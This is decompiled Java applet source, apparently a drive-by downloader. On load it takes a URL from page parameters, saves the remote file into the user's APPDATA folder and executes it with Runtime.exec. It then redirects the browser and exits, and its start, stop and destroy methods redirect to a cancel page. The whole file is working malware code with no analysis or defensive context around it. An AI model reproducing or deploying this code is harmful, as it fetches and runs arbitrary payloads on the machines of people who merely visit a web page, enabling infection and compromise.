import java.io.InputStream;
import java.io.IOException;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("FileName");
        final String getenv = System.getenv("APPDATA");
        final String parameter2 = this.getParameter("RunRedirect");
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + parameter);
            final InputStream inputStream = new URL(this.getParameter("URL")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            Runtime.getRuntime().exec(getenv + parameter);
            this.getAppletContext().showDocument(new URL(parameter2));
            System.exit(0);
        }
        catch (IOException ex) {
            System.exit(0);
        }
    }
    
    @Override
    public void start() {
        try {
            this.getAppletContext().showDocument(new URL(this.getParameter("CancelRedirect")));
            System.exit(0);
        }
        catch (IOException ex) {
            System.exit(0);
        }
    }
    
    @Override
    public void stop() {
        try {
            this.getAppletContext().showDocument(new URL(this.getParameter("CancelRedirect")));
            System.exit(0);
        }
        catch (IOException ex) {
            System.exit(0);
        }
    }
    
    @Override
    public void destroy() {
        try {
            this.getAppletContext().showDocument(new URL(this.getParameter("CancelRedirect")));
            System.exit(0);
        }
        catch (IOException ex) {
            System.exit(0);
        }
    }
}
